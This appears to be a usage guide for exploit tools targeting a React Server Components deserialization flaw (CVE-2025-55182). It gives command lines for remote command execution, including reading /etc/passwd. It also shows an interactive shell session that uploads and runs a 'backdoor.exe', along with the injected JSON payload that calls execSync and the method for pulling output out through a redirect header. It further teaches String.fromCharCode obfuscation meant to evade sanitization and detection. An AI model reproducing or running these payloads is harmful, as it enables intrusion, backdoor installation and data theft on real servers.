# CVE-2025-55182 Exploitation Guide

Quick reference for `exploit.py` and `interactive_exploit.py`

## Tool Overview

**exploit.py** - Single-shot command execution, automation  
**interactive_exploit.py** - Interactive shell, manual exploration

---

## exploit.py Usage

```bash
python exploit.py -t http://target.com -c "whoami"
python exploit.py -t http://target.com -c "dir" -T 30
python exploit.py -t http://target.com -f payload.b64
```

**Arguments:** `-t` (target), `-c` (command), `-f` (upload file), `-T` (timeout)

---

## interactive_exploit.py Usage

```bash
python interactive_exploit.py -t http://target.com
python interactive_exploit.py -t http://target.com -T 30
```

### Built-in Commands

- `upload <file>` - Stealth eval upload (no process spawn, chunk 2000 chars)
- `decode <in> <out>` - Stealth eval decode (no process spawn)
- `download <file>` - Download file from target (eval, no spawn)
- `run <exe> [args]` - Execute file via `spawnSync` (no cmd/powershell)
- `eval_js <js>` - Run JS in-process (no child proc)
- `timeout [sec]` - Show/set timeout
- `info`, `history`, `clear`, `help`, `exit`
- Deprecated (for study): `upload-node`, `upload-echo`, `decode-node`, `download-legacy`

---

## File Upload Workflow

### Stealth Upload (Eval, Recommended)

```powershell
# Local
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.exe")) | Out-File file.b64

# Remote
rce #1 > upload file.b64           # eval, chunks of 2000 chars, no spawn
rce #2 > decode out.b64 file.exe   # eval, no spawn
rce #3 > file.exe
```

**One-liner (node.exe) for upload:**

```bash
# Clean version - write file
node -e "require('fs').writeFileSync('out.b64','<base64_content>')"

# Stealth version (String.fromCharCode)
node -e require(String.fromCharCode(102,115)).writeFileSync(String.fromCharCode(111,117,116,46,98,54,52),String.fromCharCode(<content_charcodes>))
```

**One-liner (node.exe) for decode:**

```bash
# Clean version - decode base64
node -e "require('fs').writeFileSync('file.exe',Buffer.from(require('fs').readFileSync('out.b64','utf8').trim(),'base64'))"

# Stealth version (String.fromCharCode)
node -e require(String.fromCharCode(102,115)).writeFileSync(String.fromCharCode(102,105,108,101,46,101,120,101),Buffer.from(require(String.fromCharCode(102,115)).readFileSync(String.fromCharCode(111,117,116,46,98,54,52),String.fromCharCode(117,116,102,56)).trim(),String.fromCharCode(98,97,115,101,54,52)))
```

**Character codes:**
- `102,115` = `'fs'`
- `111,117,116,46,98,54,52` = `'out.b64'`
- `102,105,108,101,46,101,120,101` = `'file.exe'`
- `117,116,102,56` = `'utf8'`
- `98,97,115,101,54,52` = `'base64'`

### Legacy Upload (Node.js / Echo - Deprecated)

```powershell
rce #1 > upload-node payload.b64   # spawns node.exe
# or
rce #1 > upload-echo payload.b64   # spawns cmd.exe
rce #2 > decode out.b64 payload.bin
```

**Why eval?** Pure in-process JS/FS, no child processes, uses String.fromCharCode to avoid quotes.

---

## File Download Workflow

### Stealth Download (Eval, Recommended)

```powershell
# Remote
rce #1 > download package.json   # eval, fs.readFileSync, no spawn

# Local - file saved as downloaded_package.json
```

**One-liner (node.exe):**

```bash
# Clean version
node -e "console.log(require('fs').readFileSync('file.txt','utf8'))"

# Stealth version (String.fromCharCode)
node -e console.log(require(String.fromCharCode(102,115)).readFileSync(String.fromCharCode(112,97,99,107,97,103,101,46,106,115,111,110),String.fromCharCode(117,116,102,56)))
```

**Character codes:**
- `102,115` = `'fs'`
- `112,97,99,107,97,103,101,46,106,115,111,110` = `'package.json'`
- `117,116,102,56` = `'utf8'`

### Legacy Download (type/cat - Deprecated)

```powershell
rce #1 > download-legacy file.txt   # spawns cmd.exe (Windows) or shell (Linux)
```

**Why eval?** Pure in-process JS/FS, no child processes, uses String.fromCharCode to avoid quotes.

---

## Examples

### Windows Target

```bash
python exploit.py -t http://target.com -c "whoami"
python exploit.py -t http://target.com -c "hostname"
python exploit.py -t http://target.com -c "powershell -c pwd"
```

### Linux Target

```bash
python exploit.py -t http://target.com -c "id"
python exploit.py -t http://target.com -c "uname -a"
python exploit.py -t http://target.com -c "cat /etc/passwd"
```

### Interactive Session

```bash
$ python interactive_exploit.py -t http://target.com

rce @ target.com #1 > info
rce @ target.com #2 > upload-node payload.b64
rce @ target.com #3 > decode out.b64 backdoor.exe
rce @ target.com #4 > backdoor.exe
rce @ target.com #5 > download config.json
rce @ target.com #6 > exit
```

---

## Technical Notes

### CVE-2025-55182 RCE Exploit

**Vulnerability:** React Server Components unsafe deserialization

**Attack Flow:**

```javascript
// 1. Inject fake Chunk object with custom 'then' handler
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('COMMAND').toString();..."
  }
}

// 2. React deserializes and tries to resolve fake Chunk
// 3. Custom 'then' handler executes attacker's code
// 4. Use NEXT_REDIRECT to exfiltrate output via header
```

**Payload Structure:**

```
POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data

Field 0: Malicious JSON with injected code
Field 1: Reference to Field 0 ($@0)
Field 2: Empty array []
```

**Code Execution:**

```javascript
// Executed on server
process.mainModule.require("child_process").execSync("COMMAND");

// Output encoded in base64 and exfiltrated via redirect header
throw Object.assign(new Error("NEXT_REDIRECT"), {
  digest: `NEXT_REDIRECT;push;/login?a=${base64_output};307;`,
});
```

**Output Retrieval:**

```python
# Parse response header to get command output
redirect_header = response.headers.get('X-Action-Redirect')
# Extract: /login?a=BASE64_OUTPUT
decoded_output = base64.b64decode(url_decoded)
```

---

### String.fromCharCode Technique

The `upload`/`decode` (eval) commands use `String.fromCharCode` to bypass payload sanitization and avoid quotes.

**Problem:**

```python
# Traditional Node.js command fails because quotes get escaped
cmd = "node -e \"require('fs').writeFileSync('file', data)\""
#                     ^                         ^
# sanitize_command() escapes single quotes → breaks JSON payload
```

**Solution:**

```javascript
// Convert strings to numeric character codes
'fs' → String.fromCharCode(102,115)
'out.b64' → String.fromCharCode(111,117,116,46,98,54,52)

// Final payload has zero quoted strings; safe inside JSON + eval
eval(String.fromCharCode(102,117,110,99,116,105,111,110,40,41,123,...}))
```

**Benefits:**

- No quoted strings in entire command
- Bypasses `sanitize_command()` quote escaping
- Pure numeric codes - harder to pattern match
- Native Node.js - no suspicious processes
- Works through RCE payload without breaking JSON structure

**Implementation:**

```python
def to_charcode(s):
    return ','.join(str(ord(c)) for c in s)

fs_code = to_charcode('fs')  # → "102,115"
cmd = f"node -e require(String.fromCharCode({fs_code}))..."
```